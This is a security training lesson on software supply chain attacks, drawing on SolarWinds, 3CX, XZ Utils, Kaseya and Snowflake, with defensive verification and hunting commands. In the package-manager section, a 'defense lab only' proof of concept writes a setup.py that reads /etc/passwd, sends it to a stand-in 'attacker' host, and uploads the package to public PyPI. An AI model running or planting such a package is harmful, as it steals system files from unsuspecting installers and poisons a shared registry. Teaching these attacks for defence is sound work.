# Advanced Supply Chain Attacks

The most consequential breaches of the last decade started somewhere upstream of the victim. SolarWinds, Kaseya, 3CX, MOVEit, XZ Utils — same pattern: compromise one trusted producer, ride the trust into thousands of consumers. This lesson maps the playbooks and how to defend.

> [!warning] Awareness over execution
> Several techniques here are for defensive understanding only. Implementing a real supply-chain attack against a vendor without authorization is a serious crime in every jurisdiction.

## Why supply chain wins

A modern enterprise has 30–80 critical vendors and 1000+ open-source dependencies. Each is a transitive trust edge. Defenders monitor *their* code; they rarely audit code shipped by a vendor. Attacker math:

```
P(at least one vendor compromised) = 1 - Π(1 - p_i)
With p_i = 0.001 over 1000 deps  →  ~63% over a 5-year horizon
```

## The five attack archetypes

### 1. Build-system implant (the SolarWinds model)

Compromise the vendor's CI/CD, inject code at build time so the released binary is signed, sealed, and trusted.

![CI/CD Pipeline Compromise](/images/lessons/supply_chain_pipeline_en.png)


- **Solorigate (UNC2452, 2020)**: implant in Orion build server (`SUNSPOT`) modified `InventoryManager.cs` during compilation only — source repo stayed clean. Resulting `SolarWinds.Orion.Core.BusinessLayer.dll` was code-signed and shipped to ~18,000 customers.
- **3CX (UNC4736, 2023)**: trojanized `ffmpeg.dll` inside the signed 3CX desktop app, riding nested supply chain (X_TRADER trojan inside an employee's pre-employment system).

```terminal
# Defender: verify build provenance
slsa-verifier verify-artifact \
  --provenance-path build.intoto.jsonl \
  --source-uri github.com/vendor/orion \
  --builder-id https://github.com/vendor/orion/.github/workflows/build.yml@refs/heads/main \
  artifact.tar.gz
```

### 2. Dependency / package-manager attack

Push malicious code into a package repository. Variants:

- **Typosquat**: `colour` instead of `color`.
- **Dependency confusion**: register your private internal name on the public registry; some pip/npm/maven configs prefer the public.
- **Account takeover** of legitimate maintainer (phishing, leaked token).
- **Maintainer hand-off** — long social engineering of a tired open-source maintainer.

```terminal
# Confusion PoC (defense lab only)
echo "from urllib import request; request.urlopen('https://attacker/' + open('/etc/passwd').read())" > setup.py
echo "from setuptools import setup; setup(name='internal-tools', version='99.99.99', py_modules=[])" >> setup.py
python -m build && twine upload dist/*
# Many corporate envs install 99.99.99 from public PyPI over private 1.2.3
```

> [!info] XZ Utils (CVE-2024-3094, 2024)
> A multi-year social engineering operation by "Jia Tan" earned co-maintainer status of the xz project, then merged a binary-blob backdoor that hooked OpenSSH's RSA verification path on systemd-linked builds — would have given pre-auth RCE on most major Linux distros if it had reached stable. Caught only by a Microsoft engineer noticing 500ms login latency.

### 3. Vendor remote-management abuse (the Kaseya model)

Hit an MSP/MSSP that has agent-on-prem at hundreds of customers, then push a malicious "patch."

- **Kaseya VSA (REvil, 2021)**: 0-day in VSA agent → mass ransomware to ~1500 downstream orgs in one day.
- **ConnectWise ScreenConnect (CVE-2024-1709)**: vendor remote support, trivial auth bypass → adversary has remote-control on every connected client.

### 4. SaaS-tenant supply chain

Compromise a SaaS that has read/write API access into thousands of Microsoft 365 / Salesforce / GitHub tenants.

- **Storm-0558 (2023)**: stolen Microsoft consumer signing key was usable to forge tokens against enterprise tenants — single key = global access.
- **Snowflake credential theft (2024)**: infostealers harvested Snowflake creds from many customers; lack of MFA enforcement let attackers vacuum data tenant-by-tenant.

### 5. Hardware / firmware supply chain

- Server motherboards with extra IC (Bloomberg "The Big Hack" — disputed but technically feasible).
- BIOS/UEFI implants pre-shipped via interception (Cottonmouth-style, leaked NSA TAO catalog).
- Firmware-update server compromise (ASUS Live Update, Operation ShadowHammer, 2019).

## Hunt techniques

### For build-time implants

```terminal
# Diff successive vendor binaries — unexpected size jumps, new imports
diffoscope orion-2020.2.1.dll orion-2020.2.5.dll | head -200

# Check signature trust chain — any cross-signed cert from an unfamiliar CA
signtool verify /pa /v vendor.dll
```

### For dependency attacks

```terminal
# OSV / Snyk / GitHub advisories — known vulnerable / malicious packages
osv-scanner --recursive .

# Sigstore: verify the package was actually published from the expected workflow
cosign verify-blob \
  --certificate-identity 'https://github.com/vendor/proj/.github/workflows/release.yml@refs/tags/v1.2.3' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  --signature pkg.sig pkg.tgz
```

### For SaaS attacks

```terminal
# Audit OAuth apps in your tenant — the "rogue Azure app" category
Get-MgServicePrincipal -All | Where-Object { $_.AppRoles.Value -contains "Mail.ReadWrite" }
# Look for: rare publishers, recent consent grants, unusual scopes
```

## Defender priorities

> [!tip] Five investments that compound
> 1. **SBOM in production** — know every dependency and its origin (CycloneDX / SPDX).
> 2. **Pin + verify** — pin to checksums, verify Sigstore / SLSA provenance on build.
> 3. **Internal name reservation** on public registries (block dependency confusion).
> 4. **Vendor risk tier list** — the 5 vendors that could end your business get continuous monitoring, not annual questionnaires.
> 5. **MFA + IP allowlist** on every SaaS that holds customer data; quarterly OAuth-app audit.

## Strategic question for leadership

> Pick your top three vendors by access (not by spend). For each, write a single page: what could they do to you on their worst day? Now imagine those vendors got phished. Have you contracted for a coordinated incident response, including the right to image their build servers? If not, your supply chain risk is a sentence on a slide, not a control.

## Notable case studies to read

- Mandiant *UNC2452 / SolarWinds Compromise — Final Report*.
- Microsoft Storm-0558 disclosure + post-mortem.
- Volexity / Mandiant 3CX investigation timeline.
- CISA *Software Supply Chain Risk Management* deep-read.
- Andres Freund's email about XZ-Utils latency anomaly (oss-security 2024-03-29).
